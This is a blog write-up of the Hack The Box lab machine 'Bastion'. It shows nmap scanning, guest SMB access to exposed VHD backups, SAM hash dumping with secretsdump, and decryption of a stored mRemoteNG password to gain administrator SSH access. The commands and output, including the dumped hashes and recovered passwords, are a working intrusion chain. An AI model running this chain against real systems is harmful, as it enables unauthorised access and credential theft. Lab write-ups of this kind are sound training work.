---
layout: post
title: HTB - bastion
date: 2025-01-10 13:49 -0400
---

Easy difficulty windows machine with an exposed backup. So we can get a lot of information from the registry files. Eventually allowing for admin access.

![image](/assets/img/bastion.png)

# starting with nmap

```bash
~/workspace/projects/htb/bastion » sudo nmap -p- $(cat ip.txt) --min-rate 1024
Nmap scan report for 10.10.10.134
Host is up (0.16s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 71.88 seconds
~/workspace/projects/htb/bastion » sudo nmap -p22,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49670 $(cat ip.txt) --min-rate 1024 -sV -sC
Starting Nmap 7.93 ( https://nmap.org ) at 2025-01-09 10:25 -04
Nmap scan report for 10.10.10.134
Host is up (0.23s latency).

PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey:
|   2048 3a56ae753c780ec8564dcb1c22bf458a (RSA)
|   256 cc2e56ab1997d5bb03fb82cd63da6801 (ECDSA)
|_  256 935f5daaca9f53e7f282e664a8a3a018 (ED25519)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -19m47s, deviation: 34m36s, median: 11s
| smb2-time:
|   date: 2025-01-09T14:26:38
|_  start_date: 2025-01-09T14:19:30
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-01-09T15:26:39+01:00
| smb2-security-mode:
|   311:
|_    Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.65 seconds
```

Using the guest account we can see a Backups share with READ and WRITE privs.

```bash
~/workspace/projects/htb/bastion » netexec smb $(cat ip.txt) -u guest -p '' --shares        130 ↵ shafou@shafou
SMB         10.10.10.134    445    BASTION          [*] Windows Server 2016 Standard 14393 x64 (name:BASTION) (domain:Bastion) (signing:False) (SMBv1:True)
SMB         10.10.10.134    445    BASTION          [+] Bastion\guest: (Guest)
SMB         10.10.10.134    445    BASTION          [*] Enumerated shares
SMB         10.10.10.134    445    BASTION          Share           Permissions     Remark
SMB         10.10.10.134    445    BASTION          -----           -----------     ------
SMB         10.10.10.134    445    BASTION          ADMIN$                          Remote Admin
SMB         10.10.10.134    445    BASTION          Backups         READ,WRITE
SMB         10.10.10.134    445    BASTION          C$                              Default share
SMB         10.10.10.134    445    BASTION          IPC$                            Remote IPC
```

We can use smbmap to list the files.

```bash
~/workspace/projects/htb/bastion » smbmap -H 10.10.10.134 -r Backups --depth 8 --no-banner -u guest
[+] IP: 10.10.10.134:445	Name: 10.10.10.134        	Status: Authenticated
Disk                                                  	Permissions	Comment
----                                                  	-----------	-------
ADMIN$                                            	NO ACCESS	Remote Admin
# ...
Backups                                           	READ, WRITE	
fw--w--w--              116 Tue Apr 16 07:43:19 2019	note.txt
fr--r--r--         37761024 Fri Feb 22 08:44:03 2019	9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
fr--r--r--       5418299392 Fri Feb 22 08:45:32 2019	9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
# ...
C$                                                	NO ACCESS	Default share
IPC$                                              	READ ONLY	Remote IPC
```

The note has the message:
`Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.`
And there are some interesting .vhd files, I think those are vm files.

Turns out you can mount them to your system rather than download then. Might need `libguestfs-tools` package on debian.

`mount -t cifs //10.10.10.134/backups /mnt -o user=,password=`
very interesting

after that we get the files from the windows registry
- Windows/System32/config/SAM
- Windows/System32/config/SECURITY
- Windows/System32/config/SYSTEM

and use inpacket secretsdump.py to get the password hashes

```bash
~/workspace/projects/htb/bastion » secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DefaultPassword
(Unknown User):bureaulampje
[*] DPAPI_SYSTEM
dpapi_machinekey:0x32764bdcb45f472159af59f1dc287fd1920016a6
dpapi_userkey:0xd2e02883757da99914e3138496705b223e9d03dd
[*] Cleaning up...
```

I think from here we can try to winrm with the hash maybe?
Not quite.

Putting the hashes on crackstation shows that one is the empty hash the other is `bureaulampje`

![image](/assets/img/bastion1.png)

Lets check winrm for `L4mpje:bureaulampje`. 

nothing, maybe smb or some other.

Ssh was the correct path, Usually it is not open in windows challenges.

```bash
l4mpje@BASTION C:\Users\L4mpje>type Desktop\user.txt
0f07b***************************
```

# root
Privileges seem normal.

```bash
l4mpje@BASTION C:\Users\L4mpje>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Services also seem normal.

```bash
l4mpje@BASTION C:\>netstat -ano | findstr LISTENING
  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       1744
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       776
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       512
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       948
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       872
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1592
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       620
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       1464
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       628
  TCP    10.10.10.134:139       0.0.0.0:0              LISTENING       4
  TCP    [::]:22                [::]:0                 LISTENING       1744
  TCP    [::]:135               [::]:0                 LISTENING       776
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       512
  TCP    [::]:49665             [::]:0                 LISTENING       948
  TCP    [::]:49666             [::]:0                 LISTENING       872
  TCP    [::]:49667             [::]:0                 LISTENING       1592
  TCP    [::]:49668             [::]:0                 LISTENING       620
  TCP    [::]:49669             [::]:0                 LISTENING       1464
  TCP    [::]:49670             [::]:0                 LISTENING       628
```

Those two directories are the most interesting on Program Files.

```bash
22-02-2019  14:19    <DIR>          OpenSSH-Win64
...
22-02-2019  14:01    <DIR>          mRemoteNG
```

Seems like there is a bug in current mRemoteNG version.
The credentials are stored in plaintext it seems so if we get a config we can just bruteforce the hash.

```console
1.76.11 (2018-10-18):

Fixes:
------
#1139: Feature "Reconnect to previously opened sessions" not working
#1136: Putty window not maximized
```

Running the executable doesn't do anything.

The config is on AppData, you just take the password from it and pass to the poc script.
[poc](https://github.com/S1lkys/CVE-2023-30367-mRemoteNG-password-dumper)

```
~/workspace/projects/htb/bastion » py mremoteng_decrypt.py -s $(cat hash.txt)                     shafou@shafou
Password: thXLHM96BeKL0ER2
```

This should be the admin ssh? And it is.

```bash
administrator@BASTION C:\Users\Administrator>type .\Desktop\root.txt
26cf7***************************
```
